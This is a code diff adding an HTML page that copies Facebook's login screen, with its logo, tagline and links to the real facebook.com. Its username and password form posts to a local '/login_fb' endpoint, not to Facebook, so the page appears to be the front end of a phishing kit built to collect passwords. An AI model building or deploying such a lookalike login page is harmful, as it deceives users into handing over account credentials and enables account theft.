@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook | login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main">
+    <div class="left">
+        <img class=logo src="./facebook_logo.svg" alt="facebook_logo"><br>
+        <h2>Facebook helps you connect and share</h2><br>
+        <h2 class="h2">with the people in your life.</h2>
+    </div>
+    <div class="right">
+        <form action="/login_fb" method="post">
+            <input type="text" name="username" id="username" placeholder="Username" required autocomplete="off"><br>
+            <input type="password" name="password" id="password" placeholder="Password" required autocomplete="off"><br>
+            <button id="login">Log In</button><br>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a><br><br>
+            <a href="https://www.facebook.com/r.php?locale=en_GB&display=page" id="new_acc">Create New Account</a>
+        </form>
+        <div class="bottom">
+            <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="link">Create a page</a>
+        <span>for a celebrity, brand or business.</span></div>
+        
+    </div>
+    </div>
+</body>
+</html>
